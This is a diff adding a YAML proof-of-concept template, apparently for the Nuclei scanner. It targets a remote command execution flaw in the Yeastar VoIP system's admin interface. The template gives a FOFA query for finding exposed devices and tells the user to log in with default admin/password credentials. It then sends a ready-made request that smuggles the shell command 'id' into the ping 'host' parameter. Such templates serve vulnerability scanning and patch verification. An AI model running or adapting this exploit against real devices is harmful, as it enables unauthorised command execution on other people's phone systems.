@@ -1,0 +1,59 @@
+id: poc-nsq3f9wrgczgv8kl
+info:
+  name: 星纵 Yeastar start存在后台远程命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nsq3f9wrgczgv8kl'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: nsq3f9wrgczgv8kl
+    fofa: app="Yeastar-VOIP"
+http:
+- raw:
+  - '使用admin/password登录系统获取cookie
+
+
+    POST /cgi/webcgi?syscore=start HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+
+    Content-Length: 128
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: close
+
+    Cookie:td=2250c15e115f9429784d4bb63a8dd046; domain=; Max-Age=900;loginname=admin; domain=; Max-Age=900; path=/;
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    Priority: u=1, i
+
+    Sec-Ch-Ua: "Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"
+
+    Sec-Ch-Ua-Mobile: ?0
+
+    Sec-Ch-Ua-Platform: "Windows"
+
+    Sec-Fetch-Dest: empty
+
+    Sec-Fetch-Mode: cors
+
+    Sec-Fetch-Site: same-origin
+
+    X-Requested-With: XMLHttpRequest
+
+
+    node=ping&weboperation=start&webmodule=maintance&webpage=menutroubleshoot&weblangprefix=l.mt.ipping&webtabsactive=2&host=345;id;'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
